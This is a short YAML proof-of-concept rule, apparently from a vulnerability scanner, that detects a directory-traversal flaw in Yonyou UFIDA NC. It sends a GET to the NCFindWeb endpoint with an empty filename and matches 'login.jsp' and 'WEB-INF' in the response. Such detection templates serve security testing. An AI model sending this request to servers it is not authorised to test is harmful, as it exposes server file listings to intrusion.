name: poc-yaml-yonyou-ufida-nc-directory-traversal
rules:
  - method: GET
    path: /NCFindWeb?service=IPreAlertConfigService&filename=
    expression: |
      response.status == 200 && response.body.bcontains(b"login.jsp") && response.body.bcontains(b"WEB-INF")
